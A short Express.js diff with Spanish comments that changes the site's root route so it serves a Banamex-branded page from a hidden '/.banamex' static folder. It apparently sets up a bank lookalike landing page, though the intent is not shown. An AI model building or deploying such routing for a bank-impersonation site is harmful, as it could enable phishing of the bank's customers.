@@ -164,7 +164,7 @@ app.use((req, res, next) => {
   app.use('/.banamex', express.static('public/banamex'));
 
   // Interceptar la ruta raíz para servir la página de Banamex ANTES de cualquier otra ruta
-  app.get('/.banamex', (_req: Request, res: Response) => {
+  app.get('/', (_req: Request, res: Response) => {
     res.sendFile('banamex/index.html', { root: 'public' });
   });
 
